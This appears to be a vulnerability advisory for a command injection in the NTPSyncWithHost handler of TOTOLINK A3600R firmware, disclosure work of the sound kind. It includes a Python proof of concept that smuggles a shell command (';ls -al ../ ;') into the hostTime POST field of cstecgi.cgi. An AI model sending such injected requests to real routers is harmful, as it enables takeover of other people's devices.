## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=63&ids=36

## Affected version

A3600R V4.1.2cu.5182_B20201102

## Vulnerability details

In the A3600R V4.1.2cu.5182_B20201102 firmware has a command injection vulnerability in the `NTPSyncWithHost` function. The `v5` variable receives the `hostTime` parameter from a POST request. However, since the user can control the input of `hostTime`, the telnet service can cause a command injection vulnerability.

![image-20240721213434160](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721213434160.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
    "topicurl":"setting/NTPSyncWithHost",
    "hostTime":";ls -al ../ ;"
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721213628055](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721213628055.png)
